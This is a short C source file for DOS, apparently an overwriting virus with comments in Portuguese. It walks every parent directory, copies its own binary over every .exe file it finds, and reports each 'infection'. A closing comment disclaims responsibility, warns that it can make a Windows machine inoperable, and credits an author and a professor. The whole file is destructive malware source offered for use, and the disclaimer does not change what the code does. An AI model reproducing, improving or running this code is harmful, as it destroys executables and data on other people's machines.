#include<stdio.h>
#include<dir.h>
#include<dos.h>

void main(int argc,char *argv[])
  {
     int bytes,i,done;
     FILE *virus,*host;
     struct ffblk *f;
      char buffer[512];

   do {
      done=findfirst("*.exe",f,0);
      while(!done) {
         virus=fopen(argv[0],"rb");
         host=fopen(f->ff_name,"rb+");
         for(;fread(buffer,512,1,virus)==1;)
         fwrite(buffer,512,1,host);
         fclose(host);
         fseek(virus,0,0);
         printf("infecting %s",f->ff_name);
         done=findnext(f);
      }
   } while(!chdir(".."));
   printf("Infecção completa...\n");
   
    /*************************************************
      IMPORTANTE!
      
      Usuários desta ferramenta Deve Saber 
      Que Não Nos Resposabilizamos pelo
      Mal Uso Desta Ferramenta.
      
      Sugiro que ele seja executado 
      (caso você consiga compilá) em uma
      máquina virtual. Caso você insista em executá-lo
      em sua máquina, saiba que poderá perder a instalação
      do Windows e tornar sua máquina inoperante.
      
      
      Code by: Zeus Xaloc Dev
      Agradecimento: prof. Flavio
      
    ***************************************************/
}

